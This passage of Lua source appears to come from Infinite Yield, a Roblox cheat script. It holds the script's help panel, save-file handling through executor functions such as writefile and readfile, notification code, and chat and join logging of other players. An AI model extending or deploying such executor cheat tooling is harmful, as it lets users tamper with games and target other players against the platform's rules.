			{68,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={66},Position=UDim2.new(0,27,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are alive",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{69,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{70,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={69},Size=UDim2.new(1,0,1,0),Text="dead",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{71,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={69},Position=UDim2.new(0,29,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are dead",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{72,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,180),ZIndex=10,}},
			{73,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={72},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Various Operators",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{74,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={72},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{75,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={72},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,16),Text="Use commas to separate multiple expressions:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{76,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={72},Position=UDim2.new(0,8,0,75),Size=UDim2.new(1,-8,0,16),Text="Use - to exclude, and + to include players in your expression:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{77,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={72},Position=UDim2.new(0,8,0,91),Size=UDim2.new(1,-8,0,16),Text=";locate %blue-friends (gets players in blue team who aren't your friends)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{78,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={72},Position=UDim2.new(0,8,0,46),Size=UDim2.new(1,-8,0,16),Text=";locate noob,noob2,bob",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{79,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={72},Position=UDim2.new(0,8,0,120),Size=UDim2.new(1,-8,0,16),Text="Put ! before a command to run it with the last arguments it was ran with:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{80,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={72},Position=UDim2.new(0,8,0,136),Size=UDim2.new(1,-8,0,32),Text="After running ;offset 0 100 0,  you can run !offset anytime to repeat that command with the same arguments that were used to run it last time",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{81,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,154),ZIndex=10,}},
			{82,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={81},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Command Looping",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{83,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={81},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,20),Text="Form: [How many times it loops]^[delay (optional)]^[command]",TextColor3=Color3.new(1,1,1),TextSize=15,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{84,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={81},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{85,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={81},Position=UDim2.new(0,8,0,50),Size=UDim2.new(1,-8,0,20),Text="Use the 'breakloops' command to stop all running loops.",TextColor3=Color3.new(1,1,1),TextSize=15,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{86,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={81},Position=UDim2.new(0,8,0,80),Size=UDim2.new(1,-8,0,16),Text="Examples:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{87,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={81},Position=UDim2.new(0,8,0,98),Size=UDim2.new(1,-8,0,42),Text=";5^btools - gives you 5 sets of btools\n;10^3^drophats - drops your hats every 3 seconds 10 times\n;inf^0.1^animspeed 100 - infinitely loops your animation speed to 100",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{88,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,120),ZIndex=10,}},
			{89,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={88},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Execute Multiple Commands at Once",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{90,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={88},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,20),Text="You can execute multiple commands at once using \"\\\"",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{91,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={88},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{92,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={88},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,-8,0,16),Text="Examples:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{93,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={88},Position=UDim2.new(0,8,0,78),Size=UDim2.new(1,-8,0,32),Text=";drophats\\respawn - drops your hats and respawns you\n;enable inventory\\enable playerlist\\refresh - enables those coregui items and refreshes you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{94,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,75),ZIndex=10,}},
			{95,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={94},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Browse Command History",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{96,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={94},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="While focused on the command bar, you can use the up and down arrow keys to browse recently used commands",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{97,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={94},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{98,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,75),ZIndex=10,}},
			{99,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={98},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Autocomplete in the Command Bar",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{100,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={98},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="While focused on the command bar, you can use the tab key to insert the top suggested command into the command bar.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{101,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={98},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{102,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,175),ZIndex=10,}},
			{103,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={102},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Using Event Binds",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{104,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={102},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="Use event binds to set up commands that get executed when certain events happen. You can edit the conditions for an event command to run (such as which player triggers it).",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{105,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={102},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{106,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={102},Position=UDim2.new(0,8,0,70),Size=UDim2.new(1,-8,0,48),Text="Some events may send arguments; you can use them in your event command by using $ followed by the argument number ($1, $2, etc). You can find out the order and types of these arguments by looking at the settings of the event command.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{107,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={102},Position=UDim2.new(0,8,0,130),Size=UDim2.new(1,-8,0,16),Text="Example:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{108,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={102},Position=UDim2.new(0,8,0,148),Size=UDim2.new(1,-8,0,16),Text="Setting up 'goto $1' on the OnChatted event will teleport you to any player that chats.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{109,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,105),ZIndex=10,}},
			{110,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={109},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Get Further Help",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{111,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={109},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="You can join the Discord server to get support with IY,  and read up on more documentation such as the Plugin API.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{112,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={109},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),Visible=false,ZIndex=10,}},
			{113,"TextButton",{BackgroundColor3=Color3.new(0.48627451062202,0.61960786581039,0.85098040103912),BorderColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),Font=4,Name="InviteButton",Parent={109},Position=UDim2.new(0,5,0,75),Size=UDim2.new(1,-10,0,25),Text="Copy Discord Invite Link (https://discord.io/infiniteyield)",TextColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),TextSize=16,ZIndex=10,}},
		})
		for i,v in pairs(main.Content.List:GetDescendants()) do
			if v:IsA("TextLabel") then
				table.insert(text1,v)
			end
		end
		table.insert(scroll,main.Content.List)
		table.insert(shade1,main.Content)
		table.insert(shade2,main.TopBar)
		main.Name = randomString()
		main.TopBar.Close.MouseButton1Click:Connect(function()
			main:TweenPosition(UDim2.new(0.5,-250,0,-500), "InOut", "Quart", 0.5, true, nil)
		end)
		local inviteButton = main:FindFirstChild("InviteButton",true)
		local lastPress = nil
		inviteButton.MouseButton1Click:Connect(function()
			local func = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
			if func then
				func("https://discord.io/infiniteyield")
				inviteButton.Text = "Copied"
			else
				inviteButton.Text = "No Clipboard Function, type out the link"
			end
			local pressTime = tick()
			lastPress = pressTime
			wait(2)
			if lastPress ~= pressTime then return end
			inviteButton.Text = "Copy Discord Invite Link (https://discord.io/infiniteyield)"
		end)
		dragGUI(main)
		main.Parent = PARENT

		ReferenceButton.MouseButton1Click:Connect(function()
			main:TweenPosition(UDim2.new(0.5,-250,0.5,-150), "InOut", "Quart", 0.5, true, nil)
		end)
	end)()

	currentShade1 = Color3.fromRGB(36, 36, 37)
	currentShade2 = Color3.fromRGB(46, 46, 47)
	currentShade3 = Color3.fromRGB(78, 78, 79)
	currentText1 = Color3.new(1, 1, 1)
	currentText2 = Color3.new(0, 0, 0)
	currentScroll = Color3.fromRGB(78,78,79)

	defaultsettings = {
		prefix = ';';
		StayOpen = false;
		logsEnabled = false;
		jLogsEnabled = false;
		aliases = {};
		binds = {};
		WayPoints = {};
		PluginsTable = {};
		currentShade1 = {currentShade1.R,currentShade1.G,currentShade1.B};
		currentShade2 = {currentShade2.R,currentShade2.G,currentShade2.B};
		currentShade3 = {currentShade3.R,currentShade3.G,currentShade3.B};
		currentText1 = {currentText1.R,currentText1.G,currentText1.B};
		currentText2 = {currentText2.R,currentText2.G,currentText2.B};
		currentScroll = {currentScroll.R,currentScroll.G,currentScroll.B};
		eventBinds = eventEditor.SaveData()
	}

	defaults = game:GetService("HttpService"):JSONEncode(defaultsettings)

	nosaves = false

	local loadedEventData = nil
	function saves()
		if writefileExploit() then
			if pcall(function() readfile("IY_FE.iy") end) then
				if readfile("IY_FE.iy") ~= nil then
					local success, response = pcall(function()
						local json = game:GetService("HttpService"):JSONDecode(readfile("IY_FE.iy"))
						if json.prefix ~= nil then prefix = json.prefix else prefix = ';' end
						if json.StayOpen ~= nil then StayOpen = json.StayOpen else StayOpen = false end
						if json.logsEnabled ~= nil then logsEnabled = json.logsEnabled else logsEnabled = false end
						if json.jLogsEnabled ~= nil then jLogsEnabled = json.jLogsEnabled else jLogsEnabled = false end
						if json.aliases ~= nil then aliases = json.aliases else aliases = {} end
						if json.binds ~= nil then binds = json.binds else binds = {} end
						if json.spawnCmds ~= nil then spawnCmds = json.spawnCmds end
						if json.WayPoints ~= nil then AllWaypoints = json.WayPoints else WayPoints = {} AllWaypoints = {} end
						if json.PluginsTable ~= nil then PluginsTable = json.PluginsTable else PluginsTable = {} end
						if json.currentShade1 ~= nil then currentShade1 = Color3.new(json.currentShade1[1],json.currentShade1[2],json.currentShade1[3]) end
						if json.currentShade2 ~= nil then currentShade2 = Color3.new(json.currentShade2[1],json.currentShade2[2],json.currentShade2[3]) end
						if json.currentShade3 ~= nil then currentShade3 = Color3.new(json.currentShade3[1],json.currentShade3[2],json.currentShade3[3]) end
						if json.currentText1 ~= nil then currentText1 = Color3.new(json.currentText1[1],json.currentText1[2],json.currentText1[3]) end
						if json.currentText2 ~= nil then currentText2 = Color3.new(json.currentText2[1],json.currentText2[2],json.currentText2[3]) end
						if json.currentScroll ~= nil then currentScroll = Color3.new(json.currentScroll[1],json.currentScroll[2],json.currentScroll[3]) end
						if json.eventBinds then loadedEventData = json.eventBinds end
					end)
					if not success then
						warn("Save Json Error:", response)
						warn("Overwriting Save File")
						writefileCooldown("IY_FE.iy", defaults)
						wait()
						saves()
					end
				else
					writefileCooldown("IY_FE.iy", defaults)
					wait()
					saves()
				end
			else
				writefileCooldown("IY_FE.iy", defaults)
				wait()
				if pcall(function() readfile("IY_FE.iy") end) then
					saves()
				else
					nosaves = true
					prefix = ';'
					StayOpen = false
					logsEnabled = false
					jLogsEnabled = false
					aliases = {}
					binds = {}
					WayPoints = {}
					PluginsTable = {}

					local FileError = Instance.new("Frame")
					local background = Instance.new("Frame")
					local Directions = Instance.new("TextLabel")
					local shadow = Instance.new("Frame")
					local PopupText = Instance.new("TextLabel")
					local Exit = Instance.new("TextButton")
					local ExitImage = Instance.new("ImageLabel")

					FileError.Name = randomString()
					FileError.Parent = PARENT
					FileError.Active = true
					FileError.BackgroundTransparency = 1
					FileError.Position = UDim2.new(0.5, -180, 0, 290)
					FileError.Size = UDim2.new(0, 360, 0, 20)
					FileError.ZIndex = 10

					background.Name = "background"
					background.Parent = FileError
					background.Active = true
					background.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
					background.BorderSizePixel = 0
					background.Position = UDim2.new(0, 0, 0, 20)
					background.Size = UDim2.new(0, 360, 0, 205)
					background.ZIndex = 10

					Directions.Name = "Directions"
					Directions.Parent = background
					Directions.BackgroundTransparency = 1
					Directions.BorderSizePixel = 0
					Directions.Position = UDim2.new(0, 10, 0, 10)
					Directions.Size = UDim2.new(0, 340, 0, 185)
					Directions.Font = Enum.Font.SourceSans
					Directions.TextSize = 14
					Directions.Text = "There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again."
					Directions.TextColor3 = Color3.new(1, 1, 1)
					Directions.TextWrapped = true
					Directions.TextXAlignment = Enum.TextXAlignment.Left
					Directions.TextYAlignment = Enum.TextYAlignment.Top
					Directions.ZIndex = 10

					shadow.Name = "shadow"
					shadow.Parent = FileError
					shadow.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
					shadow.BorderSizePixel = 0
					shadow.Size = UDim2.new(0, 360, 0, 20)
					shadow.ZIndex = 10

					PopupText.Name = "PopupText"
					PopupText.Parent = shadow
					PopupText.BackgroundTransparency = 1
					PopupText.Size = UDim2.new(1, 0, 0.95, 0)
					PopupText.ZIndex = 10
					PopupText.Font = Enum.Font.SourceSans
					PopupText.TextSize = 14
					PopupText.Text = "File Error"
					PopupText.TextColor3 = Color3.new(1, 1, 1)
					PopupText.TextWrapped = true

					Exit.Name = "Exit"
					Exit.Parent = shadow
					Exit.BackgroundTransparency = 1
					Exit.Position = UDim2.new(1, -20, 0, 0)
					Exit.Size = UDim2.new(0, 20, 0, 20)
					Exit.Text = ""
					Exit.ZIndex = 10

					ExitImage.Parent = Exit
					ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
					ExitImage.BackgroundTransparency = 1
					ExitImage.Position = UDim2.new(0, 5, 0, 5)
					ExitImage.Size = UDim2.new(0, 10, 0, 10)
					ExitImage.Image = "rbxassetid://5054663650"
					ExitImage.ZIndex = 10

					Exit.MouseButton1Click:Connect(function()
						FileError:Destroy()
					end)
				end
			end
		else
			prefix = ';'
			StayOpen = false
			logsEnabled = false
			jLogsEnabled = false
			aliases = {}
			binds = {}
			WayPoints = {}
			PluginsTable = {}
		end
	end

	saves()

	function updatesaves()
		if nosaves == false and writefileExploit() then
			local update = {
				prefix = prefix;
				StayOpen = StayOpen;
				logsEnabled = logsEnabled;
				jLogsEnabled = jLogsEnabled;
				aliases = aliases;
				binds = binds;
				WayPoints = AllWaypoints;
				PluginsTable = PluginsTable;
				currentShade1 = {currentShade1.R,currentShade1.G,currentShade1.B};
				currentShade2 = {currentShade2.R,currentShade2.G,currentShade2.B};
				currentShade3 = {currentShade3.R,currentShade3.G,currentShade3.B};
				currentText1 = {currentText1.R,currentText1.G,currentText1.B};
				currentText2 = {currentText2.R,currentText2.G,currentText2.B};
				currentScroll = {currentScroll.R,currentScroll.G,currentScroll.B};
				eventBinds = eventEditor.SaveData()
			}
			writefileCooldown("IY_FE.iy", game:GetService("HttpService"):JSONEncode(update))
		end
	end

	eventEditor.SetOnEdited(updatesaves)

	pWayPoints = {}
	WayPoints = {}

	if #AllWaypoints > 0 then
		for i = 1, #AllWaypoints do
			if not AllWaypoints[i].GAME or AllWaypoints[i].GAME == game.PlaceId then
				WayPoints[#WayPoints + 1] = {NAME = AllWaypoints[i].NAME, COORD = {AllWaypoints[i].COORD[1], AllWaypoints[i].COORD[2], AllWaypoints[i].COORD[3]}, GAME = AllWaypoints[i].GAME}
			end
		end
	end

	function Time()
		local HOUR = math.floor((tick() % 86400) / 3600)
		local MINUTE = math.floor((tick() % 3600) / 60)
		local SECOND = math.floor(tick() % 60)
		local AP = HOUR > 11 and 'PM' or 'AM'
		HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
		HOUR = HOUR < 10 and '0' .. HOUR or HOUR
		MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
		SECOND = SECOND < 10 and '0' .. SECOND or SECOND
		return HOUR .. ':' .. MINUTE .. ':' .. SECOND .. ' ' .. AP
	end

	PrefixBox.Text = prefix
	local SettingsOpen = false

	if StayOpen == false then
		On.BackgroundTransparency = 1
	else
		On.BackgroundTransparency = 0
	end

	if logsEnabled then
		Toggle.Text = 'Enabled'
	else
		Toggle.Text = 'Disabled'
	end

	if jLogsEnabled then
		Toggle_2.Text = 'Enabled'
	else
		Toggle_2.Text = 'Disabled'
	end

	function maximizeHolder()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -220), "InOut", "Quart", 0.2, true, nil)
		end
	end

	local minimizeNum = -20
	function minimizeHolder()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, minimizeNum), "InOut", "Quart", 0.5, true, nil)
		end
	end

	function cmdbarHolder()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -45), "InOut", "Quart", 0.5, true, nil)
		end
	end

	pinNotification = nil
	local notifyCount = 0
	function notify(text,text2,length)
		spawn(function()
			local LnotifyCount = notifyCount+1
			local notificationPinned = false
			notifyCount = notifyCount+1
			if pinNotification then pinNotification:Disconnect() end
			pinNotification = PinButton.MouseButton1Click:Connect(function()
				spawn(function()
					pinNotification:Disconnect()
					notificationPinned = true
					Title_2.BackgroundTransparency = 1
					wait(0.5)
					Title_2.BackgroundTransparency = 0
				end)
			end)
			Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.6)
			local closepressed = false
			if text2 then
				Title_2.Text = text
				Text_2.Text = text2
			else
				Title_2.Text = 'Notification'
				Text_2.Text = text
			end
			Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, -100), "InOut", "Quart", 0.5, true, nil)
			CloseButton.MouseButton1Click:Connect(function()
				Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
				closepressed = true
				pinNotification:Disconnect()
			end)
			if length and isNumber(length) then
				wait(length)
			else
				wait(10)
			end
			if LnotifyCount == notifyCount then
				if closepressed == false and notificationPinned == false then
					pinNotification:Disconnect()
					Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
				end
				notifyCount = 0
			end
		end)
	end

	local lastMessage = nil
	local lastLabel = nil
	local dupeCount = 1
	function CreateLabel(Name, Text)
		if lastMessage == Name..Text then
			dupeCount = dupeCount+1
			lastLabel.Text = Time()..' - ['..Name..']: '..Text..' (x'..dupeCount..')'
		else
			if dupeCount > 1 then dupeCount = 1 end
			if #scroll_2:GetChildren() >= 2546 then
				scroll_2:ClearAllChildren()
			end
			local alls = 0
			for i,v in pairs(scroll_2:GetChildren()) do
				if v then
					alls = v.Size.Y.Offset + alls
				end
				if not v then
					alls = 0
				end
			end
			local tl = Instance.new('TextLabel')
			lastMessage = Name..Text
			lastLabel = tl
			tl.Name = Name
			tl.Parent = scroll_2
			tl.ZIndex = 10
			tl.Text = Time().." - ["..Name.."]: "..Text
			tl.Size = UDim2.new(0,322,0,84)
			tl.BackgroundTransparency = 1
			tl.BorderSizePixel = 0
			tl.Font = "SourceSans"
			tl.Position = UDim2.new(-1,0,0,alls)
			tl.TextTransparency = 1
			tl.TextScaled = false
			tl.TextSize = 14
			tl.TextWrapped = true
			tl.TextXAlignment = "Left"
			tl.TextYAlignment = "Top"
			tl.TextColor3 = currentText1
			tl.Size = UDim2.new(0,322,0,tl.TextBounds.Y)
			table.insert(text1,tl)
			scroll_2.CanvasSize = UDim2.new(0,0,0,alls+tl.TextBounds.Y)
			scroll_2.CanvasPosition = Vector2.new(0,scroll_2.CanvasPosition.Y+tl.TextBounds.Y)
			tl:TweenPosition(UDim2.new(0,3,0,alls), 'In', 'Quint', 0.5)
			for i = 0,50 do wait(0.05)
				tl.TextTransparency = tl.TextTransparency - 0.05
			end
			tl.TextTransparency = 0
		end
	end

	function CreateJoinLabel(plr,ID)
		if #scroll_3:GetChildren() >= 2546 then
			scroll_3:ClearAllChildren()
		end
		local infoFrame = Instance.new("Frame")
		local info1 = Instance.new("TextLabel")
		local info2 = Instance.new("TextLabel")
		local ImageLabel_3 = Instance.new("ImageLabel")
		infoFrame.Name = randomString()
		infoFrame.Parent = scroll_3
		infoFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		infoFrame.BackgroundTransparency = 1
		infoFrame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		infoFrame.Size = UDim2.new(1, 0, 0, 50)
		info1.Name = randomString()
		info1.Parent = infoFrame
		info1.BackgroundTransparency = 1
		info1.BorderSizePixel = 0
		info1.Position = UDim2.new(0, 45, 0, 0)
		info1.Size = UDim2.new(0, 135, 1, 0)
		info1.ZIndex = 10
		info1.Font = Enum.Font.SourceSans
		info1.FontSize = Enum.FontSize.Size14
		info1.Text = "Username: "..plr.Name.."\nJoined Server: "..Time()
		info1.TextColor3 = Color3.new(1, 1, 1)
		info1.TextWrapped = true
		info1.TextXAlignment = Enum.TextXAlignment.Left
		info2.Name = randomString()
		info2.Parent = infoFrame
		info2.BackgroundTransparency = 1
		info2.BorderSizePixel = 0
		info2.Position = UDim2.new(0, 185, 0, 0)
		info2.Size = UDim2.new(0, 140, 1, -5)
		info2.ZIndex = 10
		info2.Font = Enum.Font.SourceSans
		info2.FontSize = Enum.FontSize.Size14
		info2.Text = "User ID: "..ID.."\nAccount Age: "..plr.AccountAge.."\nJoined Roblox: Loading..."
		info2.TextColor3 = Color3.new(1, 1, 1)
		info2.TextWrapped = true
		info2.TextXAlignment = Enum.TextXAlignment.Left
		info2.TextYAlignment = Enum.TextYAlignment.Center
		ImageLabel_3.Parent = infoFrame
		ImageLabel_3.BackgroundTransparency = 1
		ImageLabel_3.BorderSizePixel = 0
		ImageLabel_3.Size = UDim2.new(0, 45, 1, 0)
		ImageLabel_3.Image = game.Players:GetUserThumbnailAsync(ID, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
		scroll_3.CanvasSize = UDim2.new(0, 0, 0, listlayout.AbsoluteContentSize.Y)
